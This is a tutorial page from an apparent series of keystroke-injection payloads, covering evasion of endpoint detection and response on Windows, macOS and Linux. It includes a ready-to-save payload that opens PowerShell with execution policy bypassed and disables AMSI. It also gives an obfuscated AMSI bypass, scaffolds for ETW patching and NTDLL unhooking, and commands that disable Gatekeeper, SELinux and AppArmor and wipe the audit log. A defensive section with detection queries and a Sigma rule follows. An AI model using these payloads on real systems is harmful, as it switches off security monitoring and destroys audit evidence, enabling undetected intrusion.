# FZ-E04: EDR Evasion

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-E04 |
| **Name** | EDR Evasion |
| **Difficulty** | Expert |
| **Target OS** | Windows 10/11 |
| **Focus** | Bypassing endpoint detection |
| **MITRE ATT&CK** | T1562 (Impair Defenses), T1055 (Process Injection) |

## What This Payload Does

Demonstrates techniques to evade Endpoint Detection and Response (EDR) solutions. Understanding these techniques is essential for both red teams (testing defenses) and blue teams (improving detection).

---

## Understanding EDR

```
┌─────────────────────────────────────────────────────────────┐
│                    HOW EDR WORKS                             │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│   APPLICATION LAYER                                          │
│   ├── PowerShell.exe                                         │
│   ├── cmd.exe                                                │
│   └── Custom malware                                         │
│            │                                                  │
│            ▼                                                  │
│   USER-MODE HOOKS (ntdll.dll)                                │
│   ├── NtCreateFile → EDR intercepts                         │
│   ├── NtWriteVirtualMemory → EDR intercepts                  │
│   └── NtCreateThreadEx → EDR intercepts                      │
│            │                                                  │
│            ▼                                                  │
│   KERNEL CALLBACKS                                           │
│   ├── Process creation                                       │
│   ├── Thread creation                                        │
│   ├── Image loading                                          │
│   └── Registry operations                                    │
│            │                                                  │
│            ▼                                                  │
│   EDR AGENT → Cloud Analysis → Alert                         │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```ducky
REM =============================================
REM EXPERT: EDR Evasion Techniques
REM Target: Windows 10/11
REM Focus: Bypassing endpoint detection
REM Skill: Expert
REM WARNING: For authorized testing only
REM =============================================

DELAY 2500

REM Open PowerShell
GUI r
DELAY 500
STRING powershell -ep bypass
ENTER
DELAY 1500

REM === TECHNIQUE 1: AMSI Bypass (First Priority) ===
STRINGLN $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
STRINGLN $f=$a.GetField('amsiInitFailed','NonPublic,Static')
STRINGLN $f.SetValue($null,$true)

REM === TECHNIQUE 2: ETW Patching ===
STRINGLN # Disable Event Tracing for Windows
STRINGLN $ntdll = @"
STRINGLN using System;
STRINGLN using System.Runtime.InteropServices;
STRINGLN public class Ntdll {
STRINGLN     [DllImport("ntdll.dll")]
STRINGLN     public static extern uint EtwEventWrite(IntPtr RegHandle, IntPtr EventDescriptor, uint UserDataCount, IntPtr UserData);
STRINGLN }
STRINGLN "@
STRINGLN Add-Type $ntdll
STRINGLN # ETW patching would modify EtwEventWrite to return early

REM === TECHNIQUE 3: Parent PID Spoofing Concept ===
STRINGLN # Make process appear to be spawned by different parent
STRINGLN # Requires PPID spoofing implementation

REM === TECHNIQUE 4: Direct Syscalls Concept ===
STRINGLN # Bypass user-mode hooks by calling kernel directly
STRINGLN # Requires assembly-level syscall implementation

REM === TECHNIQUE 5: Unhooking NTDLL ===
STRINGLN # Restore original NTDLL from disk to remove EDR hooks
STRINGLN $ntdllPath = "C:\Windows\System32\ntdll.dll"
STRINGLN $cleanNtdll = [IO.File]::ReadAllBytes($ntdllPath)
STRINGLN # Would need to remap clean NTDLL sections

REM === Execute actual payload after bypasses ===
STRINGLN Write-Host "EDR evasion techniques applied (demonstration)"

REM === Cleanup ===
STRINGLN Remove-Variable a,f,ntdll -Force -ErrorAction SilentlyContinue
STRINGLN exit
```

---

## EDR Evasion Techniques

### 1. AMSI Bypass (Covered in FZ-A01)

```powershell
# Classic AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated version
$a = 'System.Management.Automation.A]msiUtils'.Replace(']','')
[Ref].Assembly.GetType($a).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### 2. ETW Patching

```powershell
# Concept: Patch EtwEventWrite to prevent logging
# This prevents events from being sent to EDR

$patch = @"
using System;
using System.Runtime.InteropServices;

public class ETW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

# Would patch ntdll!EtwEventWrite to return immediately
```

### 3. NTDLL Unhooking

```powershell
# Concept: Restore original NTDLL to remove EDR hooks

function Unhook-NTDLL {
    # Read clean NTDLL from disk
    $ntdllPath = "C:\Windows\System32\ntdll.dll"
    $cleanBytes = [IO.File]::ReadAllBytes($ntdllPath)

    # Get loaded NTDLL base address
    $ntdll = [System.Diagnostics.Process]::GetCurrentProcess().Modules |
        Where-Object { $_.ModuleName -eq "ntdll.dll" }

    # Parse PE headers, find .text section
    # Replace hooked bytes with clean bytes
    # This removes EDR inline hooks
}
```

### 4. Direct Syscalls

```powershell
# Concept: Call Windows kernel directly, bypassing user-mode hooks

# Instead of:
# NtCreateFile() -> EDR Hook -> Kernel

# Use:
# syscall instruction -> Kernel directly

# Requires: Assembly code to invoke syscall with correct syscall numbers
# Tools: SysWhispers, HellsGate, RecycledGate
```

### 5. Parent PID Spoofing

```powershell
# Make malicious process appear to be child of legitimate process

$startInfo = New-Object System.Diagnostics.ProcessStartInfo
$startInfo.FileName = "powershell.exe"
$startInfo.Arguments = "-c calc.exe"

# Modify STARTUPINFOEX to specify parent PID
# Process will appear as child of specified parent
```

### 6. Process Hollowing

```powershell
# Create suspended legitimate process
# Hollow out its memory
# Replace with malicious code
# Resume execution

# Steps:
# 1. CreateProcess with CREATE_SUSPENDED
# 2. NtUnmapViewOfSection (hollow the process)
# 3. VirtualAllocEx (allocate new memory)
# 4. WriteProcessMemory (write malicious code)
# 5. SetThreadContext (set entry point)
# 6. ResumeThread
```

---

## Cross-Platform Evasion

### macOS - Disable Security Features

```ducky
REM macOS security evasion is limited without root
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
REM Check SIP status
STRINGLN csrutil status

REM Disable Gatekeeper for session (if admin)
STRINGLN sudo spctl --master-disable 2>/dev/null

REM Clear quarantine attribute
STRINGLN xattr -d com.apple.quarantine /path/to/file 2>/dev/null
```

### Linux - Disable Security

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Check SELinux status
STRINGLN getenforce

REM Disable temporarily (requires root)
STRINGLN sudo setenforce 0 2>/dev/null

REM Disable AppArmor profile
STRINGLN sudo aa-disable /etc/apparmor.d/profile 2>/dev/null

REM Clear audit logs
STRINGLN sudo truncate -s 0 /var/log/audit/audit.log 2>/dev/null
```

---

## EDR Products and Their Hooks

| EDR Product | Hooked APIs | Detection Method |
|-------------|-------------|------------------|
| CrowdStrike | NtCreateThreadEx, NtAllocateVirtualMemory | Kernel callbacks |
| Carbon Black | NtWriteVirtualMemory, NtProtectVirtualMemory | User-mode hooks |
| SentinelOne | Most NT functions | Hybrid hooks |
| Microsoft Defender ATP | NtCreateFile, NtWriteFile | Kernel + AMSI |
| Elastic EDR | Process creation, Network | Event-based |

---

## Red Team Perspective

### Evasion Strategy

```
1. Reconnaissance
   └── Identify EDR product
   └── Understand hook locations

2. Bypass Selection
   └── Choose appropriate technique
   └── Test in similar environment

3. Execution
   └── Apply bypasses first
   └── Execute payload
   └── Verify no alerts

4. Cleanup
   └── Restore modified state
   └── Remove artifacts
```

### Testing Bypasses

```powershell
# Check if AMSI is active
'Invoke-Mimikatz'  # Should error if AMSI active

# Check for hooks on NTDLL
$proc = Get-Process -Id $PID
$ntdll = $proc.Modules | Where-Object { $_.ModuleName -eq "ntdll.dll" }
# Compare .text section with clean copy
```

---

## Blue Team Perspective

### Detecting Evasion Attempts

```powershell
# Detect AMSI tampering
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 500 | Where-Object {
    $_.Message -match 'AmsiUtils|amsiInitFailed|AmsiScanBuffer'
}

# Detect ETW tampering
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} | Where-Object {
    $_.Message -match 'EtwEventWrite|NtTraceEvent'
}

# Detect unhooking attempts
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational'
    Id=7  # Image Load
} | Where-Object {
    $_.Message -match 'ntdll\.dll' -and $_.Message -match 'powershell'
}
```

### Sigma Rule

```yaml
title: EDR Evasion Attempt
status: experimental
description: Detects common EDR evasion techniques
logsource:
    product: windows
    category: ps_script
detection:
    selection_amsi:
        ScriptBlockText|contains:
            - 'AmsiUtils'
            - 'amsiInitFailed'
            - 'AmsiScanBuffer'
    selection_etw:
        ScriptBlockText|contains:
            - 'EtwEventWrite'
            - 'NtTraceEvent'
            - 'EVENT_TRACE'
    selection_unhook:
        ScriptBlockText|contains:
            - 'ntdll.dll'
            - 'VirtualProtect'
            - 'WriteProcessMemory'
    selection_syscall:
        ScriptBlockText|contains:
            - 'syscall'
            - 'NtCreateThread'
            - 'NtAllocateVirtualMemory'
    condition: selection_amsi or selection_etw or selection_unhook or selection_syscall
level: critical
tags:
    - attack.defense_evasion
    - attack.t1562
```

### Defense Recommendations

1. **Kernel-Level Monitoring**: EDR should use kernel callbacks
2. **Behavioral Analysis**: Detect patterns, not signatures
3. **Memory Scanning**: Regular memory inspection
4. **Integrity Monitoring**: Detect NTDLL modifications
5. **Canary Hooks**: Deploy fake hooks to detect unhooking

---

## Practice Exercises

### Exercise 1: Identify EDR
Write a script to detect which EDR is running:
```powershell
# Check for known EDR processes
```

### Exercise 2: Analyze Hooks
Examine NTDLL for potential hooks:
```powershell
# Compare loaded NTDLL with disk version
```

### Exercise 3: Detection Rule
Create a detection rule for unhooking attempts.

---

## Payload File

Save as `FZ-E04_EDR_Evasion.txt`:

```ducky
REM FZ-E04: EDR Evasion
DELAY 2500
GUI r
DELAY 500
STRING powershell -ep bypass
ENTER
DELAY 1500
STRINGLN $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true);Write-Host "AMSI Bypassed";exit
```

---

[← FZ-E03 C2 Framework](FZ-E03_C2_Framework.md) | [Back to Expert](README.md) | [Next: FZ-E05 Red Team Simulation →](FZ-E05_Red_Team_Simulation.md)
